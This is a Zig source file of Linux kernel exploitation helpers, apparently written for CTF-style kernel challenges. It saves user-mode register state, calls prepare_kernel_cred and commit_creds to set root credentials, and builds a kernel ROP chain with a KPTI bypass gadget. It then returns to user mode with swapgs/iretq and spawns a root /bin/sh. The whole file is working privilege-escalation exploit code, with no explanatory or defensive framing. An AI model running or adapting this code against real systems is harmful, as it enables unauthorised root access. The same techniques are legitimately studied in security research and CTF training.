const std = @import("std");
const ctx_mod = @import("context.zig");
const sym = @import("sym.zig");

const c = @cImport({
    @cInclude("stdint.h");
    @cInclude("stdlib.h");
    @cInclude("unistd.h");
});

pub fn spawn_shell() noreturn {
    const uid = c.getuid();
    if (uid != 0) {
        std.debug.print("[-] failed to get root (uid: {d})\n", .{uid});
        c.exit(1);
        unreachable;
    }

    std.debug.print("[+] got root (uid = 0)\n", .{});
    std.debug.print("[ ] spawning shell\n", .{});

    var argv = [_:null]?[*:0]const u8{"/bin/sh"};
    var envp = [_:null]?[*:0]const u8{};
    _ = c.execve("/bin/sh", &argv, &envp);
    c.exit(0);
    unreachable;
}

pub fn save_state(ctx: *ctx_mod.ctx) void {
    std.debug.print("[ ] saving user cs, ss, rsp, and rflags\n", .{});

    const user_cs16: u16 = asm volatile (
        "mov %%cs, %[ret]"
        : [ret] "=r" (-> u16),
    );
    const user_ss16: u16 = asm volatile (
        "mov %%ss, %[ret]"
        : [ret] "=r" (-> u16),
    );
    const user_rsp: u64 = asm volatile (
        "mov %%rsp, %[ret]"
        : [ret] "=r" (-> u64),
    );
    const user_rflags: u64 = asm volatile (
        "pushfq\npop %[ret]"
        : [ret] "=r" (-> u64),
        :
        : .{ .memory = true }
    );

    ctx.user_cs = user_cs16;
    ctx.user_ss = user_ss16;
    ctx.user_rsp = user_rsp;
    ctx.user_rflags = user_rflags;

    std.debug.print("      user_cs     = 0x{x:0>16}\n", .{ctx.user_cs});
    std.debug.print("      user_rflags = 0x{x:0>16}\n", .{ctx.user_rflags});
    std.debug.print("      user_rsp    = 0x{x:0>16}\n", .{ctx.user_rsp});
    std.debug.print("      user_ss     = 0x{x:0>16}\n", .{ctx.user_ss});
}

pub fn restore_state(ctx: *const ctx_mod.ctx) noreturn {
    std.debug.print("[+] restoring state\n", .{});
    if (ctx.user_rsp == 0) {
        std.debug.print("[-] please call save_state in advance\n", .{});
    }

    const shell_addr = @intFromPtr(&spawn_shell);

    asm volatile (
        \\swapgs
        \\movq %[user_ss], 0x20(%%rsp)
        \\movq %[user_rsp], 0x18(%%rsp)
        \\movq %[user_rflags], 0x10(%%rsp)
        \\movq %[user_cs], 0x08(%%rsp)
        \\movq %[shell], 0x00(%%rsp)
        \\iretq
        :
        : [user_ss] "r" (ctx.user_ss),
          [user_rsp] "r" (ctx.user_rsp),
          [user_rflags] "r" (ctx.user_rflags),
          [user_cs] "r" (ctx.user_cs),
          [shell] "r" (shell_addr),
        : .{ .memory = true }
    );

    unreachable;
}

pub fn escalate_privilege(ctx: *const ctx_mod.ctx) noreturn {
    std.debug.print("[+] escalating privilege\n", .{});

    if (sym.addr_prepare_kernel_cred == sym.dummy_value or sym.addr_commit_creds == sym.dummy_value) {
        std.debug.print("[-] please set addr_prepare_kernel_cred/addr_commit_creds\n", .{});
        std.process.abort();
    }

    const prepare_kernel_cred = @as(
        *const fn (u64) callconv(.c) u64,
        @ptrFromInt(ctx.kaddr(sym.addr_prepare_kernel_cred)),
    );
    const commit_creds = @as(
        *const fn (u64) callconv(.c) void,
        @ptrFromInt(ctx.kaddr(sym.addr_commit_creds)),
    );

    if (sym.addr_init_cred == sym.dummy_value) {
        commit_creds(prepare_kernel_cred(0));
    } else {
        commit_creds(ctx.kaddr(sym.addr_init_cred));
    }

    restore_state(ctx);
}

pub fn krop(ctx: *const ctx_mod.ctx, ptr: [*]u64) void {
    ptr[0] = ctx.kaddr(sym.pop_rdi_ret);
    ptr[1] = 0;
    ptr[2] = ctx.kaddr(sym.addr_prepare_kernel_cred);
    ptr[3] = ctx.kaddr(sym.pop_rcx_ret);
    ptr[4] = 0;
    ptr[5] = ctx.kaddr(sym.mov_rdi_rax_rep_ret);
    ptr[6] = ctx.kaddr(sym.addr_commit_creds);
    ptr[7] = ctx.kaddr(sym.bypass_kpti);
    ptr[8] = 0xdeadbeef;
    ptr[9] = 0xcafebabe;
    ptr[10] = @intFromPtr(&spawn_shell);
    ptr[11] = ctx.user_cs;
    ptr[12] = ctx.user_rflags;
    ptr[13] = ctx.user_rsp;
    ptr[14] = ctx.user_ss;
}
